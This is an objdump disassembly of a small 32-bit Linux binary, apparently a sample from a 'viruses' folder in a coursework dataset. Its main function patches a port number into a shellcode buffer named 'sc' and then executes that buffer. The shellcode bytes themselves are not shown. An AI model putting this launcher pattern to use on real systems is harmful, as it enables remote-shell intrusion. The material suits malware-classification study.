
/home/stas/Coursach/Выборки/compiled/viruses/13363:     формат файла elf32-i386


Дизассемблирование раздела .interp:

08048154 <.interp>:
 8048154:	2f                   	das    
 8048155:	6c                   	insb   (%dx),%es:(%edi)
 8048156:	69 62 2f 6c 64 2d 6c 	imul   $0x6c2d646c,0x2f(%edx),%esp
 804815d:	69 6e 75 78 2e 73 6f 	imul   $0x6f732e78,0x75(%esi),%ebp
 8048164:	2e 32 00             	xor    %cs:(%eax),%al

Дизассемблирование раздела .note.ABI-tag:

08048168 <.note.ABI-tag>:
 8048168:	04 00                	add    $0x0,%al
 804816a:	00 00                	add    %al,(%eax)
 804816c:	10 00                	adc    %al,(%eax)
 804816e:	00 00                	add    %al,(%eax)
 8048170:	01 00                	add    %eax,(%eax)
 8048172:	00 00                	add    %al,(%eax)
 8048174:	47                   	inc    %edi
 8048175:	4e                   	dec    %esi
 8048176:	55                   	push   %ebp
 8048177:	00 00                	add    %al,(%eax)
 8048179:	00 00                	add    %al,(%eax)
 804817b:	00 02                	add    %al,(%edx)
 804817d:	00 00                	add    %al,(%eax)
 804817f:	00 06                	add    %al,(%esi)
 8048181:	00 00                	add    %al,(%eax)
 8048183:	00 18                	add    %bl,(%eax)
 8048185:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .note.gnu.build-id:

08048188 <.note.gnu.build-id>:
 8048188:	04 00                	add    $0x0,%al
 804818a:	00 00                	add    %al,(%eax)
 804818c:	14 00                	adc    $0x0,%al
 804818e:	00 00                	add    %al,(%eax)
 8048190:	03 00                	add    (%eax),%eax
 8048192:	00 00                	add    %al,(%eax)
 8048194:	47                   	inc    %edi
 8048195:	4e                   	dec    %esi
 8048196:	55                   	push   %ebp
 8048197:	00 e3                	add    %ah,%bl
 8048199:	ed                   	in     (%dx),%eax
 804819a:	c4 47 37             	les    0x37(%edi),%eax
 804819d:	db fd                	(bad)  
 804819f:	8a bb 6e ce 34 6d    	mov    0x6d34ce6e(%ebx),%bh
 80481a5:	78 a8                	js     804814f <_init-0x185>
 80481a7:	ea                   	.byte 0xea
 80481a8:	be                   	.byte 0xbe
 80481a9:	be                   	.byte 0xbe
 80481aa:	de 03                	fiadd  (%ebx)

Дизассемблирование раздела .gnu.hash:

080481ac <.gnu.hash>:
 80481ac:	02 00                	add    (%eax),%al
 80481ae:	00 00                	add    %al,(%eax)
 80481b0:	05 00 00 00 01       	add    $0x1000000,%eax
 80481b5:	00 00                	add    %al,(%eax)
 80481b7:	00 05 00 00 00 00    	add    %al,0x0
 80481bd:	20 00                	and    %al,(%eax)
 80481bf:	20 00                	and    %al,(%eax)
 80481c1:	00 00                	add    %al,(%eax)
 80481c3:	00 05 00 00 00 ad    	add    %al,0xad000000
 80481c9:	4b                   	dec    %ebx
 80481ca:	e3 c0                	jecxz  804818c <_init-0x148>

Дизассемблирование раздела .dynsym:

080481cc <.dynsym>:
	...
 80481dc:	1a 00                	sbb    (%eax),%al
	...
 80481e6:	00 00                	add    %al,(%eax)
 80481e8:	12 00                	adc    (%eax),%al
 80481ea:	00 00                	add    %al,(%eax)
 80481ec:	3a 00                	cmp    (%eax),%al
	...
 80481f6:	00 00                	add    %al,(%eax)
 80481f8:	20 00                	and    %al,(%eax)
 80481fa:	00 00                	add    %al,(%eax)
 80481fc:	21 00                	and    %eax,(%eax)
	...
 8048206:	00 00                	add    %al,(%eax)
 8048208:	12 00                	adc    (%eax),%al
 804820a:	00 00                	add    %al,(%eax)
 804820c:	28 00                	sub    %al,(%eax)
	...
 8048216:	00 00                	add    %al,(%eax)
 8048218:	12 00                	adc    (%eax),%al
 804821a:	00 00                	add    %al,(%eax)
 804821c:	0b 00                	or     (%eax),%eax
 804821e:	00 00                	add    %al,(%eax)
 8048220:	5c                   	pop    %esp
 8048221:	85 04 08             	test   %eax,(%eax,%ecx,1)
 8048224:	04 00                	add    $0x0,%al
 8048226:	00 00                	add    %al,(%eax)
 8048228:	11 00                	adc    %eax,(%eax)
 804822a:	0f                   	.byte 0xf
	...

Дизассемблирование раздела .dynstr:

0804822c <.dynstr>:
 804822c:	00 6c 69 62          	add    %ch,0x62(%ecx,%ebp,2)
 8048230:	63 2e                	arpl   %bp,(%esi)
 8048232:	73 6f                	jae    80482a3 <_init-0x31>
 8048234:	2e 36 00 5f 49       	cs add %bl,%cs:%ss:0x49(%edi)
 8048239:	4f                   	dec    %edi
 804823a:	5f                   	pop    %edi
 804823b:	73 74                	jae    80482b1 <_init-0x23>
 804823d:	64 69 6e 5f 75 73 65 	imul   $0x64657375,%fs:0x5f(%esi),%ebp
 8048244:	64 
 8048245:	00 70 72             	add    %dh,0x72(%eax)
 8048248:	69 6e 74 66 00 73 74 	imul   $0x74730066,0x74(%esi),%ebp
 804824f:	72 6c                	jb     80482bd <_init-0x17>
 8048251:	65 6e                	outsb  %gs:(%esi),(%dx)
 8048253:	00 5f 5f             	add    %bl,0x5f(%edi)
 8048256:	6c                   	insb   (%dx),%es:(%edi)
 8048257:	69 62 63 5f 73 74 61 	imul   $0x6174735f,0x63(%edx),%esp
 804825e:	72 74                	jb     80482d4 <_init>
 8048260:	5f                   	pop    %edi
 8048261:	6d                   	insl   (%dx),%es:(%edi)
 8048262:	61                   	popa   
 8048263:	69 6e 00 5f 5f 67 6d 	imul   $0x6d675f5f,0x0(%esi),%ebp
 804826a:	6f                   	outsl  %ds:(%esi),(%dx)
 804826b:	6e                   	outsb  %ds:(%esi),(%dx)
 804826c:	5f                   	pop    %edi
 804826d:	73 74                	jae    80482e3 <_init+0xf>
 804826f:	61                   	popa   
 8048270:	72 74                	jb     80482e6 <_init+0x12>
 8048272:	5f                   	pop    %edi
 8048273:	5f                   	pop    %edi
 8048274:	00 47 4c             	add    %al,0x4c(%edi)
 8048277:	49                   	dec    %ecx
 8048278:	42                   	inc    %edx
 8048279:	43                   	inc    %ebx
 804827a:	5f                   	pop    %edi
 804827b:	32 2e                	xor    (%esi),%ch
 804827d:	30 00                	xor    %al,(%eax)

Дизассемблирование раздела .gnu.version:

08048280 <.gnu.version>:
 8048280:	00 00                	add    %al,(%eax)
 8048282:	02 00                	add    (%eax),%al
 8048284:	00 00                	add    %al,(%eax)
 8048286:	02 00                	add    (%eax),%al
 8048288:	02 00                	add    (%eax),%al
 804828a:	01 00                	add    %eax,(%eax)

Дизассемблирование раздела .gnu.version_r:

0804828c <.gnu.version_r>:
 804828c:	01 00                	add    %eax,(%eax)
 804828e:	01 00                	add    %eax,(%eax)
 8048290:	01 00                	add    %eax,(%eax)
 8048292:	00 00                	add    %al,(%eax)
 8048294:	10 00                	adc    %al,(%eax)
 8048296:	00 00                	add    %al,(%eax)
 8048298:	00 00                	add    %al,(%eax)
 804829a:	00 00                	add    %al,(%eax)
 804829c:	10 69 69             	adc    %ch,0x69(%ecx)
 804829f:	0d 00 00 02 00       	or     $0x20000,%eax
 80482a4:	49                   	dec    %ecx
 80482a5:	00 00                	add    %al,(%eax)
 80482a7:	00 00                	add    %al,(%eax)
 80482a9:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .rel.dyn:

080482ac <.rel.dyn>:
 80482ac:	fc                   	cld    
 80482ad:	9f                   	lahf   
 80482ae:	04 08                	add    $0x8,%al
 80482b0:	06                   	push   %es
 80482b1:	02 00                	add    (%eax),%al
	...

Дизассемблирование раздела .rel.plt:

080482b4 <.rel.plt>:
 80482b4:	0c a0                	or     $0xa0,%al
 80482b6:	04 08                	add    $0x8,%al
 80482b8:	07                   	pop    %es
 80482b9:	01 00                	add    %eax,(%eax)
 80482bb:	00 10                	add    %dl,(%eax)
 80482bd:	a0 04 08 07 02       	mov    0x2070804,%al
 80482c2:	00 00                	add    %al,(%eax)
 80482c4:	14 a0                	adc    $0xa0,%al
 80482c6:	04 08                	add    $0x8,%al
 80482c8:	07                   	pop    %es
 80482c9:	03 00                	add    (%eax),%eax
 80482cb:	00 18                	add    %bl,(%eax)
 80482cd:	a0 04 08 07 04       	mov    0x4070804,%al
	...

Дизассемблирование раздела .init:

080482d4 <_init>:
 80482d4:	53                   	push   %ebx
 80482d5:	83 ec 08             	sub    $0x8,%esp
 80482d8:	e8 a3 00 00 00       	call   8048380 <__x86.get_pc_thunk.bx>
 80482dd:	81 c3 23 1d 00 00    	add    $0x1d23,%ebx
 80482e3:	8b 83 fc ff ff ff    	mov    -0x4(%ebx),%eax
 80482e9:	85 c0                	test   %eax,%eax
 80482eb:	74 05                	je     80482f2 <_init+0x1e>
 80482ed:	e8 2e 00 00 00       	call   8048320 <__gmon_start__@plt>
 80482f2:	83 c4 08             	add    $0x8,%esp
 80482f5:	5b                   	pop    %ebx
 80482f6:	c3                   	ret    

Дизассемблирование раздела .plt:

08048300 <printf@plt-0x10>:
 8048300:	ff 35 04 a0 04 08    	pushl  0x804a004
 8048306:	ff 25 08 a0 04 08    	jmp    *0x804a008
 804830c:	00 00                	add    %al,(%eax)
	...

08048310 <printf@plt>:
 8048310:	ff 25 0c a0 04 08    	jmp    *0x804a00c
 8048316:	68 00 00 00 00       	push   $0x0
 804831b:	e9 e0 ff ff ff       	jmp    8048300 <_init+0x2c>

08048320 <__gmon_start__@plt>:
 8048320:	ff 25 10 a0 04 08    	jmp    *0x804a010
 8048326:	68 08 00 00 00       	push   $0x8
 804832b:	e9 d0 ff ff ff       	jmp    8048300 <_init+0x2c>

08048330 <strlen@plt>:
 8048330:	ff 25 14 a0 04 08    	jmp    *0x804a014
 8048336:	68 10 00 00 00       	push   $0x10
 804833b:	e9 c0 ff ff ff       	jmp    8048300 <_init+0x2c>

08048340 <__libc_start_main@plt>:
 8048340:	ff 25 18 a0 04 08    	jmp    *0x804a018
 8048346:	68 18 00 00 00       	push   $0x18
 804834b:	e9 b0 ff ff ff       	jmp    8048300 <_init+0x2c>

Дизассемблирование раздела .text:

08048350 <_start>:
 8048350:	31 ed                	xor    %ebp,%ebp
 8048352:	5e                   	pop    %esi
 8048353:	89 e1                	mov    %esp,%ecx
 8048355:	83 e4 f0             	and    $0xfffffff0,%esp
 8048358:	50                   	push   %eax
 8048359:	54                   	push   %esp
 804835a:	52                   	push   %edx
 804835b:	68 40 85 04 08       	push   $0x8048540
 8048360:	68 d0 84 04 08       	push   $0x80484d0
 8048365:	51                   	push   %ecx
 8048366:	56                   	push   %esi
 8048367:	68 86 84 04 08       	push   $0x8048486
 804836c:	e8 cf ff ff ff       	call   8048340 <__libc_start_main@plt>
 8048371:	f4                   	hlt    
 8048372:	66 90                	xchg   %ax,%ax
 8048374:	66 90                	xchg   %ax,%ax
 8048376:	66 90                	xchg   %ax,%ax
 8048378:	66 90                	xchg   %ax,%ax
 804837a:	66 90                	xchg   %ax,%ax
 804837c:	66 90                	xchg   %ax,%ax
 804837e:	66 90                	xchg   %ax,%ax

08048380 <__x86.get_pc_thunk.bx>:
 8048380:	8b 1c 24             	mov    (%esp),%ebx
 8048383:	c3                   	ret    
 8048384:	66 90                	xchg   %ax,%ax
 8048386:	66 90                	xchg   %ax,%ax
 8048388:	66 90                	xchg   %ax,%ax
 804838a:	66 90                	xchg   %ax,%ax
 804838c:	66 90                	xchg   %ax,%ax
 804838e:	66 90                	xchg   %ax,%ax

08048390 <deregister_tm_clones>:
 8048390:	b8 ab a0 04 08       	mov    $0x804a0ab,%eax
 8048395:	2d a8 a0 04 08       	sub    $0x804a0a8,%eax
 804839a:	83 f8 06             	cmp    $0x6,%eax
 804839d:	77 01                	ja     80483a0 <deregister_tm_clones+0x10>
 804839f:	c3                   	ret    
 80483a0:	b8 00 00 00 00       	mov    $0x0,%eax
 80483a5:	85 c0                	test   %eax,%eax
 80483a7:	74 f6                	je     804839f <deregister_tm_clones+0xf>
 80483a9:	55                   	push   %ebp
 80483aa:	89 e5                	mov    %esp,%ebp
 80483ac:	83 ec 18             	sub    $0x18,%esp
 80483af:	c7 04 24 a8 a0 04 08 	movl   $0x804a0a8,(%esp)
 80483b6:	ff d0                	call   *%eax
 80483b8:	c9                   	leave  
 80483b9:	c3                   	ret    
 80483ba:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi

080483c0 <register_tm_clones>:
 80483c0:	b8 a8 a0 04 08       	mov    $0x804a0a8,%eax
 80483c5:	2d a8 a0 04 08       	sub    $0x804a0a8,%eax
 80483ca:	c1 f8 02             	sar    $0x2,%eax
 80483cd:	89 c2                	mov    %eax,%edx
 80483cf:	c1 ea 1f             	shr    $0x1f,%edx
 80483d2:	01 d0                	add    %edx,%eax
 80483d4:	d1 f8                	sar    %eax
 80483d6:	75 01                	jne    80483d9 <register_tm_clones+0x19>
 80483d8:	c3                   	ret    
 80483d9:	ba 00 00 00 00       	mov    $0x0,%edx
 80483de:	85 d2                	test   %edx,%edx
 80483e0:	74 f6                	je     80483d8 <register_tm_clones+0x18>
 80483e2:	55                   	push   %ebp
 80483e3:	89 e5                	mov    %esp,%ebp
 80483e5:	83 ec 18             	sub    $0x18,%esp
 80483e8:	89 44 24 04          	mov    %eax,0x4(%esp)
 80483ec:	c7 04 24 a8 a0 04 08 	movl   $0x804a0a8,(%esp)
 80483f3:	ff d2                	call   *%edx
 80483f5:	c9                   	leave  
 80483f6:	c3                   	ret    
 80483f7:	89 f6                	mov    %esi,%esi
 80483f9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi

08048400 <__do_global_dtors_aux>:
 8048400:	80 3d a5 a0 04 08 00 	cmpb   $0x0,0x804a0a5
 8048407:	75 13                	jne    804841c <__do_global_dtors_aux+0x1c>
 8048409:	55                   	push   %ebp
 804840a:	89 e5                	mov    %esp,%ebp
 804840c:	83 ec 08             	sub    $0x8,%esp
 804840f:	e8 7c ff ff ff       	call   8048390 <deregister_tm_clones>
 8048414:	c6 05 a5 a0 04 08 01 	movb   $0x1,0x804a0a5
 804841b:	c9                   	leave  
 804841c:	f3 c3                	repz ret 
 804841e:	66 90                	xchg   %ax,%ax

08048420 <frame_dummy>:
 8048420:	a1 10 9f 04 08       	mov    0x8049f10,%eax
 8048425:	85 c0                	test   %eax,%eax
 8048427:	74 1f                	je     8048448 <frame_dummy+0x28>
 8048429:	b8 00 00 00 00       	mov    $0x0,%eax
 804842e:	85 c0                	test   %eax,%eax
 8048430:	74 16                	je     8048448 <frame_dummy+0x28>
 8048432:	55                   	push   %ebp
 8048433:	89 e5                	mov    %esp,%ebp
 8048435:	83 ec 18             	sub    $0x18,%esp
 8048438:	c7 04 24 10 9f 04 08 	movl   $0x8049f10,(%esp)
 804843f:	ff d0                	call   *%eax
 8048441:	c9                   	leave  
 8048442:	e9 79 ff ff ff       	jmp    80483c0 <register_tm_clones>
 8048447:	90                   	nop
 8048448:	e9 73 ff ff ff       	jmp    80483c0 <register_tm_clones>

0804844d <SET_PORT>:
 804844d:	55                   	push   %ebp
 804844e:	89 e5                	mov    %esp,%ebp
 8048450:	83 ec 10             	sub    $0x10,%esp
 8048453:	8b 45 08             	mov    0x8(%ebp),%eax
 8048456:	8d 50 16             	lea    0x16(%eax),%edx
 8048459:	8b 45 0c             	mov    0xc(%ebp),%eax
 804845c:	66 89 02             	mov    %ax,(%edx)
 804845f:	8b 45 08             	mov    0x8(%ebp),%eax
 8048462:	0f b6 40 16          	movzbl 0x16(%eax),%eax
 8048466:	88 45 ff             	mov    %al,-0x1(%ebp)
 8048469:	8b 45 08             	mov    0x8(%ebp),%eax
 804846c:	8d 50 16             	lea    0x16(%eax),%edx
 804846f:	8b 45 08             	mov    0x8(%ebp),%eax
 8048472:	0f b6 40 17          	movzbl 0x17(%eax),%eax
 8048476:	88 02                	mov    %al,(%edx)
 8048478:	8b 45 08             	mov    0x8(%ebp),%eax
 804847b:	8d 50 17             	lea    0x17(%eax),%edx
 804847e:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
 8048482:	88 02                	mov    %al,(%edx)
 8048484:	c9                   	leave  
 8048485:	c3                   	ret    

08048486 <main>:
 8048486:	55                   	push   %ebp
 8048487:	89 e5                	mov    %esp,%ebp
 8048489:	83 e4 f0             	and    $0xfffffff0,%esp
 804848c:	83 ec 10             	sub    $0x10,%esp
 804848f:	c7 04 24 40 a0 04 08 	movl   $0x804a040,(%esp)
 8048496:	e8 95 fe ff ff       	call   8048330 <strlen@plt>
 804849b:	89 44 24 04          	mov    %eax,0x4(%esp)
 804849f:	c7 04 24 60 85 04 08 	movl   $0x8048560,(%esp)
 80484a6:	e8 65 fe ff ff       	call   8048310 <printf@plt>
 80484ab:	c7 44 24 04 35 82 00 	movl   $0x8235,0x4(%esp)
 80484b2:	00 
 80484b3:	c7 04 24 40 a0 04 08 	movl   $0x804a040,(%esp)
 80484ba:	e8 8e ff ff ff       	call   804844d <SET_PORT>
 80484bf:	e8 7c 1b 00 00       	call   804a040 <sc>
 80484c4:	c9                   	leave  
 80484c5:	c3                   	ret    
 80484c6:	66 90                	xchg   %ax,%ax
 80484c8:	66 90                	xchg   %ax,%ax
 80484ca:	66 90                	xchg   %ax,%ax
 80484cc:	66 90                	xchg   %ax,%ax
 80484ce:	66 90                	xchg   %ax,%ax

080484d0 <__libc_csu_init>:
 80484d0:	55                   	push   %ebp
 80484d1:	57                   	push   %edi
 80484d2:	31 ff                	xor    %edi,%edi
 80484d4:	56                   	push   %esi
 80484d5:	53                   	push   %ebx
 80484d6:	e8 a5 fe ff ff       	call   8048380 <__x86.get_pc_thunk.bx>
 80484db:	81 c3 25 1b 00 00    	add    $0x1b25,%ebx
 80484e1:	83 ec 1c             	sub    $0x1c,%esp
 80484e4:	8b 6c 24 30          	mov    0x30(%esp),%ebp
 80484e8:	8d b3 0c ff ff ff    	lea    -0xf4(%ebx),%esi
 80484ee:	e8 e1 fd ff ff       	call   80482d4 <_init>
 80484f3:	8d 83 08 ff ff ff    	lea    -0xf8(%ebx),%eax
 80484f9:	29 c6                	sub    %eax,%esi
 80484fb:	c1 fe 02             	sar    $0x2,%esi
 80484fe:	85 f6                	test   %esi,%esi
 8048500:	74 27                	je     8048529 <__libc_csu_init+0x59>
 8048502:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
 8048508:	8b 44 24 38          	mov    0x38(%esp),%eax
 804850c:	89 2c 24             	mov    %ebp,(%esp)
 804850f:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048513:	8b 44 24 34          	mov    0x34(%esp),%eax
 8048517:	89 44 24 04          	mov    %eax,0x4(%esp)
 804851b:	ff 94 bb 08 ff ff ff 	call   *-0xf8(%ebx,%edi,4)
 8048522:	83 c7 01             	add    $0x1,%edi
 8048525:	39 f7                	cmp    %esi,%edi
 8048527:	75 df                	jne    8048508 <__libc_csu_init+0x38>
 8048529:	83 c4 1c             	add    $0x1c,%esp
 804852c:	5b                   	pop    %ebx
 804852d:	5e                   	pop    %esi
 804852e:	5f                   	pop    %edi
 804852f:	5d                   	pop    %ebp
 8048530:	c3                   	ret    
 8048531:	eb 0d                	jmp    8048540 <__libc_csu_fini>
 8048533:	90                   	nop
 8048534:	90                   	nop
 8048535:	90                   	nop
 8048536:	90                   	nop
 8048537:	90                   	nop
 8048538:	90                   	nop
 8048539:	90                   	nop
 804853a:	90                   	nop
 804853b:	90                   	nop
 804853c:	90                   	nop
 804853d:	90                   	nop
 804853e:	90                   	nop
 804853f:	90                   	nop

08048540 <__libc_csu_fini>:
 8048540:	f3 c3                	repz ret 

Дизассемблирование раздела .fini:

08048544 <_fini>:
 8048544:	53                   	push   %ebx
 8048545:	83 ec 08             	sub    $0x8,%esp
 8048548:	e8 33 fe ff ff       	call   8048380 <__x86.get_pc_thunk.bx>
 804854d:	81 c3 b3 1a 00 00    	add    $0x1ab3,%ebx
 8048553:	83 c4 08             	add    $0x8,%esp
 8048556:	5b                   	pop    %ebx
 8048557:	c3                   	ret    

Дизассемблирование раздела .rodata:

08048558 <_fp_hw>:
 8048558:	03 00                	add    (%eax),%eax
	...

0804855c <_IO_stdin_used>:
 804855c:	01 00                	add    %eax,(%eax)
 804855e:	02 00                	add    (%eax),%al
 8048560:	73 69                	jae    80485cb <_IO_stdin_used+0x6f>
 8048562:	7a 65                	jp     80485c9 <_IO_stdin_used+0x6d>
 8048564:	3a 20                	cmp    (%eax),%ah
 8048566:	25 64 20 62 79       	and    $0x79622064,%eax
 804856b:	74 65                	je     80485d2 <_IO_stdin_used+0x76>
 804856d:	73 0a                	jae    8048579 <_IO_stdin_used+0x1d>
	...

Дизассемблирование раздела .eh_frame_hdr:

08048570 <.eh_frame_hdr>:
 8048570:	01 1b                	add    %ebx,(%ebx)
 8048572:	03 3b                	add    (%ebx),%edi
 8048574:	30 00                	xor    %al,(%eax)
 8048576:	00 00                	add    %al,(%eax)
 8048578:	05 00 00 00 90       	add    $0x90000000,%eax
 804857d:	fd                   	std    
 804857e:	ff                   	(bad)  
 804857f:	ff 4c 00 00          	decl   0x0(%eax,%eax,1)
 8048583:	00 dd                	add    %bl,%ch
 8048585:	fe                   	(bad)  
 8048586:	ff                   	(bad)  
 8048587:	ff 70 00             	pushl  0x0(%eax)
 804858a:	00 00                	add    %al,(%eax)
 804858c:	16                   	push   %ss
 804858d:	ff                   	(bad)  
 804858e:	ff                   	(bad)  
 804858f:	ff 90 00 00 00 60    	call   *0x60000000(%eax)
 8048595:	ff                   	(bad)  
 8048596:	ff                   	(bad)  
 8048597:	ff b0 00 00 00 d0    	pushl  -0x30000000(%eax)
 804859d:	ff                   	(bad)  
 804859e:	ff                   	(bad)  
 804859f:	ff                   	(bad)  
 80485a0:	ec                   	in     (%dx),%al
 80485a1:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .eh_frame:

080485a4 <__FRAME_END__-0xcc>:
 80485a4:	14 00                	adc    $0x0,%al
 80485a6:	00 00                	add    %al,(%eax)
 80485a8:	00 00                	add    %al,(%eax)
 80485aa:	00 00                	add    %al,(%eax)
 80485ac:	01 7a 52             	add    %edi,0x52(%edx)
 80485af:	00 01                	add    %al,(%ecx)
 80485b1:	7c 08                	jl     80485bb <_IO_stdin_used+0x5f>
 80485b3:	01 1b                	add    %ebx,(%ebx)
 80485b5:	0c 04                	or     $0x4,%al
 80485b7:	04 88                	add    $0x88,%al
 80485b9:	01 00                	add    %eax,(%eax)
 80485bb:	00 20                	add    %ah,(%eax)
 80485bd:	00 00                	add    %al,(%eax)
 80485bf:	00 1c 00             	add    %bl,(%eax,%eax,1)
 80485c2:	00 00                	add    %al,(%eax)
 80485c4:	3c fd                	cmp    $0xfd,%al
 80485c6:	ff                   	(bad)  
 80485c7:	ff 50 00             	call   *0x0(%eax)
 80485ca:	00 00                	add    %al,(%eax)
 80485cc:	00 0e                	add    %cl,(%esi)
 80485ce:	08 46 0e             	or     %al,0xe(%esi)
 80485d1:	0c 4a                	or     $0x4a,%al
 80485d3:	0f 0b                	ud2    
 80485d5:	74 04                	je     80485db <_IO_stdin_used+0x7f>
 80485d7:	78 00                	js     80485d9 <_IO_stdin_used+0x7d>
 80485d9:	3f                   	aas    
 80485da:	1a 3b                	sbb    (%ebx),%bh
 80485dc:	2a 32                	sub    (%edx),%dh
 80485de:	24 22                	and    $0x22,%al
 80485e0:	1c 00                	sbb    $0x0,%al
 80485e2:	00 00                	add    %al,(%eax)
 80485e4:	40                   	inc    %eax
 80485e5:	00 00                	add    %al,(%eax)
 80485e7:	00 65 fe             	add    %ah,-0x2(%ebp)
 80485ea:	ff                   	(bad)  
 80485eb:	ff                   	(bad)  
 80485ec:	39 00                	cmp    %eax,(%eax)
 80485ee:	00 00                	add    %al,(%eax)
 80485f0:	00 41 0e             	add    %al,0xe(%ecx)
 80485f3:	08 85 02 42 0d 05    	or     %al,0x50d4202(%ebp)
 80485f9:	75 c5                	jne    80485c0 <_IO_stdin_used+0x64>
 80485fb:	0c 04                	or     $0x4,%al
 80485fd:	04 00                	add    $0x0,%al
 80485ff:	00 1c 00             	add    %bl,(%eax,%eax,1)
 8048602:	00 00                	add    %al,(%eax)
 8048604:	60                   	pusha  
 8048605:	00 00                	add    %al,(%eax)
 8048607:	00 7e fe             	add    %bh,-0x2(%esi)
 804860a:	ff                   	(bad)  
 804860b:	ff 40 00             	incl   0x0(%eax)
 804860e:	00 00                	add    %al,(%eax)
 8048610:	00 41 0e             	add    %al,0xe(%ecx)
 8048613:	08 85 02 42 0d 05    	or     %al,0x50d4202(%ebp)
 8048619:	7c c5                	jl     80485e0 <_IO_stdin_used+0x84>
 804861b:	0c 04                	or     $0x4,%al
 804861d:	04 00                	add    $0x0,%al
 804861f:	00 38                	add    %bh,(%eax)
 8048621:	00 00                	add    %al,(%eax)
 8048623:	00 80 00 00 00 a8    	add    %al,-0x58000000(%eax)
 8048629:	fe                   	(bad)  
 804862a:	ff                   	(bad)  
 804862b:	ff 61 00             	jmp    *0x0(%ecx)
 804862e:	00 00                	add    %al,(%eax)
 8048630:	00 41 0e             	add    %al,0xe(%ecx)
 8048633:	08 85 02 41 0e 0c    	or     %al,0xc0e4102(%ebp)
 8048639:	87 03                	xchg   %eax,(%ebx)
 804863b:	43                   	inc    %ebx
 804863c:	0e                   	push   %cs
 804863d:	10 86 04 41 0e 14    	adc    %al,0x140e4104(%esi)
 8048643:	83 05 4e 0e 30 02 48 	addl   $0x48,0x2300e4e
 804864a:	0e                   	push   %cs
 804864b:	14 41                	adc    $0x41,%al
 804864d:	c3                   	ret    
 804864e:	0e                   	push   %cs
 804864f:	10 41 c6             	adc    %al,-0x3a(%ecx)
 8048652:	0e                   	push   %cs
 8048653:	0c 41                	or     $0x41,%al
 8048655:	c7                   	(bad)  
 8048656:	0e                   	push   %cs
 8048657:	08 41 c5             	or     %al,-0x3b(%ecx)
 804865a:	0e                   	push   %cs
 804865b:	04 10                	add    $0x10,%al
 804865d:	00 00                	add    %al,(%eax)
 804865f:	00 bc 00 00 00 dc fe 	add    %bh,-0x1240000(%eax,%eax,1)
 8048666:	ff                   	(bad)  
 8048667:	ff 02                	incl   (%edx)
 8048669:	00 00                	add    %al,(%eax)
 804866b:	00 00                	add    %al,(%eax)
 804866d:	00 00                	add    %al,(%eax)
	...

08048670 <__FRAME_END__>:
 8048670:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .init_array:

08049f08 <__frame_dummy_init_array_entry>:
 8049f08:	20                   	.byte 0x20
 8049f09:	84 04 08             	test   %al,(%eax,%ecx,1)

Дизассемблирование раздела .fini_array:

08049f0c <__do_global_dtors_aux_fini_array_entry>:
 8049f0c:	00                   	.byte 0x0
 8049f0d:	84 04 08             	test   %al,(%eax,%ecx,1)

Дизассемблирование раздела .jcr:

08049f10 <__JCR_END__>:
 8049f10:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .dynamic:

08049f14 <_DYNAMIC>:
 8049f14:	01 00                	add    %eax,(%eax)
 8049f16:	00 00                	add    %al,(%eax)
 8049f18:	01 00                	add    %eax,(%eax)
 8049f1a:	00 00                	add    %al,(%eax)
 8049f1c:	0c 00                	or     $0x0,%al
 8049f1e:	00 00                	add    %al,(%eax)
 8049f20:	d4 82                	aam    $0x82
 8049f22:	04 08                	add    $0x8,%al
 8049f24:	0d 00 00 00 44       	or     $0x44000000,%eax
 8049f29:	85 04 08             	test   %eax,(%eax,%ecx,1)
 8049f2c:	19 00                	sbb    %eax,(%eax)
 8049f2e:	00 00                	add    %al,(%eax)
 8049f30:	08 9f 04 08 1b 00    	or     %bl,0x1b0804(%edi)
 8049f36:	00 00                	add    %al,(%eax)
 8049f38:	04 00                	add    $0x0,%al
 8049f3a:	00 00                	add    %al,(%eax)
 8049f3c:	1a 00                	sbb    (%eax),%al
 8049f3e:	00 00                	add    %al,(%eax)
 8049f40:	0c 9f                	or     $0x9f,%al
 8049f42:	04 08                	add    $0x8,%al
 8049f44:	1c 00                	sbb    $0x0,%al
 8049f46:	00 00                	add    %al,(%eax)
 8049f48:	04 00                	add    $0x0,%al
 8049f4a:	00 00                	add    %al,(%eax)
 8049f4c:	f5                   	cmc    
 8049f4d:	fe                   	(bad)  
 8049f4e:	ff 6f ac             	ljmp   *-0x54(%edi)
 8049f51:	81 04 08 05 00 00 00 	addl   $0x5,(%eax,%ecx,1)
 8049f58:	2c 82                	sub    $0x82,%al
 8049f5a:	04 08                	add    $0x8,%al
 8049f5c:	06                   	push   %es
 8049f5d:	00 00                	add    %al,(%eax)
 8049f5f:	00 cc                	add    %cl,%ah
 8049f61:	81 04 08 0a 00 00 00 	addl   $0xa,(%eax,%ecx,1)
 8049f68:	53                   	push   %ebx
 8049f69:	00 00                	add    %al,(%eax)
 8049f6b:	00 0b                	add    %cl,(%ebx)
 8049f6d:	00 00                	add    %al,(%eax)
 8049f6f:	00 10                	add    %dl,(%eax)
 8049f71:	00 00                	add    %al,(%eax)
 8049f73:	00 15 00 00 00 00    	add    %dl,0x0
 8049f79:	00 00                	add    %al,(%eax)
 8049f7b:	00 03                	add    %al,(%ebx)
 8049f7d:	00 00                	add    %al,(%eax)
 8049f7f:	00 00                	add    %al,(%eax)
 8049f81:	a0 04 08 02 00       	mov    0x20804,%al
 8049f86:	00 00                	add    %al,(%eax)
 8049f88:	20 00                	and    %al,(%eax)
 8049f8a:	00 00                	add    %al,(%eax)
 8049f8c:	14 00                	adc    $0x0,%al
 8049f8e:	00 00                	add    %al,(%eax)
 8049f90:	11 00                	adc    %eax,(%eax)
 8049f92:	00 00                	add    %al,(%eax)
 8049f94:	17                   	pop    %ss
 8049f95:	00 00                	add    %al,(%eax)
 8049f97:	00 b4 82 04 08 11 00 	add    %dh,0x110804(%edx,%eax,4)
 8049f9e:	00 00                	add    %al,(%eax)
 8049fa0:	ac                   	lods   %ds:(%esi),%al
 8049fa1:	82                   	(bad)  
 8049fa2:	04 08                	add    $0x8,%al
 8049fa4:	12 00                	adc    (%eax),%al
 8049fa6:	00 00                	add    %al,(%eax)
